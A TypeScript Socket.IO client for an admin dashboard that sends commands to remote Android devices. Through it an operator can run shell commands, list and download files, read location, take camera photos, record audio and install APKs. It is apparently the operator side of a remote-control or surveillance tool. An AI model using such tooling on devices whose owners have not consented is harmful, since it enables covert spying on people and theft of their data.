import { io, Socket } from 'socket.io-client';

let socket: Socket | null = null;

export interface SocketEvents {
  // Connection events
  connect: () => void;
  disconnect: (reason: string) => void;
  
  // Device events
  'device:connect': (data: { deviceId: string; deviceInfo: any }) => void;
  'device:disconnect': (data: { deviceId: string }) => void;
  'device:status': (data: { deviceId: string; status: any }) => void;
  
  // Screen sharing events
  'screen:update': (data: { deviceId: string; screenshot: string }) => void;
  'screen:request': (data: { deviceId: string }) => void;
  
  // Command events
  'command:execute': (data: { deviceId: string; commandId: string; command: string }) => void;
  'command:result': (data: { deviceId: string; commandId: string; result: any }) => void;
  
  // File events
  'file:list': (data: { deviceId: string; path: string }) => void;
  'file:upload': (data: { deviceId: string; file: any; path: string }) => void;
  'file:download': (data: { deviceId: string; filePath: string }) => void;
  
  // Location events
  'location:request': (data: { deviceId: string }) => void;
  'location:update': (data: { deviceId: string; location: any }) => void;
  
  // Camera events
  'camera:capture': (data: { deviceId: string; camera: 'front' | 'back' }) => void;
  'camera:result': (data: { deviceId: string; imageUrl: string }) => void;
  
  // Audio events
  'audio:record': (data: { deviceId: string; duration: number }) => void;
  'audio:result': (data: { deviceId: string; audioData: any }) => void;
  
  // App events
  'app:list': (data: { deviceId: string }) => void;
  'app:install': (data: { deviceId: string; apkData: any }) => void;
  'app:uninstall': (data: { deviceId: string; packageName: string }) => void;
  
  // Notification events
  'notification:send': (data: { deviceId: string; message: string }) => void;
  'notification:received': (data: { deviceId: string; notification: any }) => void;
  
  // Error events
  error: (data: { error: string; details?: any }) => void;
}

export interface ClientToServerEvents {
  // Admin to server events
  'admin:authenticate': (data: { token: string }) => void;
  'admin:join': (data: { adminId: string }) => void;
  
  // Device control commands
  'device:screenshot': (data: { deviceId: string }) => void;
  'device:command': (data: { deviceId: string; command: string }) => void;
  'device:files': (data: { deviceId: string; path?: string }) => void;
  'device:location': (data: { deviceId: string }) => void;
  'device:camera': (data: { deviceId: string; camera: 'front' | 'back' }) => void;
  'device:audio': (data: { deviceId: string; duration: number }) => void;
  'device:apps': (data: { deviceId: string }) => void;
  'device:notify': (data: { deviceId: string; message: string }) => void;
}

export interface ServerToClientEvents extends SocketEvents {}

/**
 * Initialize Socket.IO client connection
 */
export function initSocket(serverUrl?: string): Socket {
  if (socket && socket.connected) {
    return socket;
  }

  const url = serverUrl || (typeof window !== 'undefined' ? window.location.origin : 'http://localhost:3000');
  
  socket = io(url, {
    transports: ['websocket', 'polling'],
    upgrade: true,
    rememberUpgrade: true,
    autoConnect: true,
    reconnection: true,
    reconnectionAttempts: 5,
    reconnectionDelay: 1000,
    maxReconnectionAttempts: 5,
    timeout: 20000,
    forceNew: false
  });

  // Connection event handlers
  socket.on('connect', () => {
    console.log('Socket connected:', socket?.id);
  });

  socket.on('disconnect', (reason) => {
    console.log('Socket disconnected:', reason);
  });

  socket.on('connect_error', (error) => {
    console.error('Socket connection error:', error);
  });

  socket.on('reconnect', (attemptNumber) => {
    console.log('Socket reconnected after', attemptNumber, 'attempts');
  });

  socket.on('reconnect_failed', () => {
    console.error('Socket reconnection failed');
  });

  return socket;
}

/**
 * Get current socket instance
 */
export function getSocket(): Socket | null {
  return socket;
}

/**
 * Disconnect socket
 */
export function disconnectSocket(): void {
  if (socket) {
    socket.disconnect();
    socket = null;
  }
}

/**
 * Emit event with error handling
 */
export function emitWithCallback<T = any>(
  event: keyof ClientToServerEvents,
  data: any,
  timeout: number = 5000
): Promise<T> {
  return new Promise((resolve, reject) => {
    if (!socket || !socket.connected) {
      reject(new Error('Socket not connected'));
      return;
    }

    const timer = setTimeout(() => {
      reject(new Error('Socket emission timeout'));
    }, timeout);

    socket.emit(event as string, data, (response: any) => {
      clearTimeout(timer);
      if (response.error) {
        reject(new Error(response.error));
      } else {
        resolve(response);
      }
    });
  });
}

/**
 * Subscribe to device events
 */
export function subscribeToDevice(deviceId: string, callbacks: Partial<SocketEvents>): void {
  if (!socket) return;

  // Filter events for specific device
  Object.entries(callbacks).forEach(([event, callback]) => {
    socket?.on(event, (data: any) => {
      if (data.deviceId === deviceId || !data.deviceId) {
        callback(data);
      }
    });
  });
}

/**
 * Unsubscribe from device events
 */
export function unsubscribeFromDevice(deviceId: string): void {
  if (!socket) return;
  
  // Remove device-specific listeners
  socket.removeAllListeners();
}

/**
 * Send command to device
 */
export async function sendDeviceCommand(deviceId: string, command: string): Promise<any> {
  return emitWithCallback('device:command', { deviceId, command });
}

/**
 * Request device screenshot
 */
export async function requestScreenshot(deviceId: string): Promise<string> {
  return emitWithCallback('device:screenshot', { deviceId });
}

/**
 * Get device files
 */
export async function getDeviceFiles(deviceId: string, path?: string): Promise<any[]> {
  return emitWithCallback('device:files', { deviceId, path });
}

/**
 * Get device location
 */
export async function getDeviceLocation(deviceId: string): Promise<any> {
  return emitWithCallback('device:location', { deviceId });
}

/**
 * Capture device camera
 */
export async function captureCamera(deviceId: string, camera: 'front' | 'back' = 'back'): Promise<string> {
  return emitWithCallback('device:camera', { deviceId, camera });
}

/**
 * Record device audio
 */
export async function recordAudio(deviceId: string, duration: number = 10): Promise<any> {
  return emitWithCallback('device:audio', { deviceId, duration });
}

/**
 * Get installed apps
 */
export async function getInstalledApps(deviceId: string): Promise<any[]> {
  return emitWithCallback('device:apps', { deviceId });
}

/**
 * Send notification to device
 */
export async function sendNotification(deviceId: string, message: string): Promise<void> {
  return emitWithCallback('device:notify', { deviceId, message });
}

/**
 * Authenticate admin session
 */
export async function authenticateAdmin(token: string): Promise<any> {
  return emitWithCallback('admin:authenticate', { token });
}

/**
 * Join admin room for receiving device events
 */
export async function joinAdminRoom(adminId: string): Promise<any> {
  return emitWithCallback('admin:join', { adminId });
}